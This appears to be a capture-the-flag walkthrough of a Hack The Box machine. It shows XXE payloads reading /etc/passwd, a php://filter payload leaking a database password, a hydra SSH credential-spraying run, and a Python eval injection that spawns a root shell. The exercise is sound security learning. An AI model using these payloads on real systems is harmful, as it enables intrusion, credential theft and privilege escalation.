After a quick nmap:
#nmap #port-discovery

		sudo nmap -sS --min-rate 5000 -vvv -n -Pn -p- $(cat ip) -oN  out.nmap

We can observe a http server running on port 80
![[Pasted image 20241106131320.png]]


Then if we go to the portal we find a form:
![[Pasted image 20241106131413.png]]

If we capture the network traffic with burpsuite intercept tool the following is found:

POST /tracker_diRbPr00f314.php HTTP/1.1
Host: bountyhunters.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 223
Origin: http://bountyhunters.htb
Connection: close
Referer: http://bountyhunters.htb/log_submit.php
Priority: u=0

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5BQUFBPC90aXRsZT4KCQk8Y3dlPkJCQkI8L2N3ZT4KCQk8Y3Zzcz5DQ0NDPC9jdnNzPgoJCTxyZXdhcmQ%2BRERERDwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg%3D%3D

The data seems to be ecnoded in URL and then in Base64:
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5BQUFBPC90aXRsZT4KCQk8Y3dlPkJCQkI8L2N3ZT4KCQk8Y3Zzcz5DQ0NDPC9jdnNzPgoJCTxyZXdhcmQ%2BRERERDwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg%3D%3D
->
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5BQUFBPC90aXRsZT4KCQk8Y3dlPkJCQkI8L2N3ZT4KCQk8Y3Zzcz5DQ0NDPC9jdnNzPgoJCTxyZXdhcmQ+RERERDwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg==
->
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>AAAA</title>
		<cwe>BBBB</cwe>
		<cvss>CCCC</cvss>
		<reward>DDDD</reward>
		</bugreport>


Lets try XXE (Xml eXternal Entity) to read files on the system


## Payload:

<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>

After some tries, still nothing interesting is being displayed. So, is time to learn: 
https://bugbase.ai/blog/demystifying-xxe-injection


Simply I didn't knew how to properly set the file path.

The final payload looks like:
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE title [<!ENTITY example SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>&example;</title>
<cwe>2222</cwe>
<cvss>3333</cvss>
<reward>AAAA</reward>
</bugreport>

Parsed into base64 and url -> 

%50%44%39%34%62%57%77%67%49%48%5a%6c%63%6e%4e%70%62%32%34%39%49%6a%45%75%4d%43%49%67%5a%57%35%6a%62%32%52%70%62%6d%63%39%49%6b%6c%54%54%79%30%34%4f%44%55%35%4c%54%45%69%50%7a%34%4b%50%43%46%45%54%30%4e%55%57%56%42%46%49%48%52%70%64%47%78%6c%49%46%73%38%49%55%56%4f%56%45%6c%55%57%53%42%6c%65%47%46%74%63%47%78%6c%49%46%4e%5a%55%31%52%46%54%53%41%69%5a%6d%6c%73%5a%54%6f%76%4c%79%39%6c%64%47%4d%76%63%47%46%7a%63%33%64%6b%49%6a%34%67%58%54%34%4b%50%47%4a%31%5a%33%4a%6c%63%47%39%79%64%44%34%4b%50%48%52%70%64%47%78%6c%50%69%5a%6c%65%47%46%74%63%47%78%6c%4f%7a%77%76%64%47%6c%30%62%47%55%2b%43%6a%78%6a%64%32%55%2b%4d%6a%49%79%4d%6a%77%76%59%33%64%6c%50%67%6f%38%59%33%5a%7a%63%7a%34%7a%4d%7a%4d%7a%50%43%39%6a%64%6e%4e%7a%50%67%6f%38%63%6d%56%33%59%58%4a%6b%50%6b%46%42%51%55%45%38%4c%33%4a%6c%64%32%46%79%5a%44%34%4b%50%43%39%69%64%57%64%79%5a%58%42%76%63%6e%51%2b

And received from the server:

|         |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| ------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Title:  | root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin development:x:1000:1000:Development:/home/development:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin |
| CWE:    | 2222                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| Score:  | 3333                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| Reward: | AAAA                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |

The next step is to perform a dirsearch for the server. And we can see a db.php file.

![[Pasted image 20241106194453.png]]

To retrieve it we will need to use PHP filter to encode a resoruce as a base64 string, that we will then see in the result.

As there is an apache2 server (wappalizer or nmap will tell you) we can assume at first that the server files are hosted in `/var/wwww/html/`. And so it does.

The payload is:
`php://filter/read=convert.base64-encode/resource=/var/www/html/db.php

->
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>


After retrieving the base64 and decoding it, we find a passwd `m19RoAU0hP41A1sTsq6K`. If we perform a cut to the output of the `/etc/passwd` and try the credential we found using hydra:

`cat etc_passwd | cut -d: -f1 > users
`hydra -L users -p $(cat pass) -I ssh://$(cat ip)
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-06 19:49:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 35 login tries (l:35/p:1), ~3 tries per task
[DATA] attacking ssh://10.10.11.100:22/
[22][ssh] host: 10.10.11.100   login: development   password: m19RoAU0hP41A1sTsq6K
[22][ssh] host: 10.10.11.100   login: development   password: m19RoAU0hP41A1sTsq6K
1 of 1 target successfully completed, 2 valid passwords found

We can now login as an user and we thus obtain the user flag:

cc1f...

Reverse engineering the .py that can be run as sudo (`sudo -l` told us)

We find out that eval method is executed as root. So, we find how we need to format the .md file read by the script so that the desired payload is executed.

The md:
# Skytrain Inc
## Ticket to ASDASD
__Ticket Code:__
**123+1 and __import__('os').system('bash')

the payload -> 123+1 and __import__('os').system('bash')
